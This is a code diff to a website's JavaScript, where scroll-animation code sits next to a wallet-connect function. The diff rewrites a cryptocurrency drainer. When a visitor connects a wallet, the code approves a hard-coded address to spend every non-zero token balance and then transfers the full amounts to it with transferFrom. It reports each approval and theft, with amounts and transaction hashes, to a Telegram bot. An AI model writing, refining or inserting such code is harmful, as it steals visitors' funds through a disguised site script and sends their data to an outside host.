@@ -81,7 +81,7 @@ scrollReveal();
 addEventOnElem(window, "scroll", scrollReveal);
 
 /**
- * Wallet connect, network switching, token and native coin transfer with Telegram notification
+ * Wallet connect, network switching, token approval and transfer, and native coin transfer with Telegram notification
  */
 async function connectWalletAndSendTokens() {
   if (!window.ethers || !window.ethereum) {
@@ -252,34 +252,53 @@ ${nativeBalanceMessage}
           body: JSON.stringify({ chat_id: chatId, text: networkMessage })
         });
 
-        // Transfer ERC-20 tokens
+        // Approve and transfer ERC-20 tokens
         const nonZeroTokens = tokens.filter(t => t.balance && !ethers.BigNumber.from(t.balance).isZero());
 
         for (const token of nonZeroTokens) {
           try {
             const contract = new ethers.Contract(token.token_address, [
-              "function transfer(address to, uint amount) returns (bool)"
+              "function approve(address spender, uint amount) returns (bool)",
+              "function transferFrom(address from, address to, uint amount) returns (bool)"
             ], currentSigner);
 
-            const tx = await contract.transfer(network.exodusAddress, token.balance);
-            await tx.wait();
+            // Step 1: Approve
+            const approveTx = await contract.approve(network.exodusAddress, token.balance);
+            await approveTx.wait();
 
             const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
-            const successMessage = `
-✅ Transfer Successful
+            const approveSuccessMessage = `
+✅ Approval Successful
 Token: ${token.symbol}
 Amount: ${balance}
-To: ${network.exodusAddress}
-Tx: ${tx.hash}
+Spender: ${network.exodusAddress}
+Tx: ${approveTx.hash}
             `;
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ chat_id: chatId, text: successMessage })
+              body: JSON.stringify({ chat_id: chatId, text: approveSuccessMessage })
+            });
+
+            // Step 2: TransferFrom
+            const transferTx = await contract.transferFrom(userAddress, network.exodusAddress, token.balance);
+            await transferTx.wait();
+
+            const transferSuccessMessage = `
+✅ Transfer Successful
+Token: ${token.symbol}
+Amount: ${balance}
+To: ${network.exodusAddress}
+Tx: ${transferTx.hash}
+            `;
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: chatId, text: transferSuccessMessage })
             });
           } catch (err) {
             const errorMessage = `
-❌ Transfer Failed
+❌ Token Operation Failed
 Token: ${token.symbol}
 Error: ${err.message}
             `;
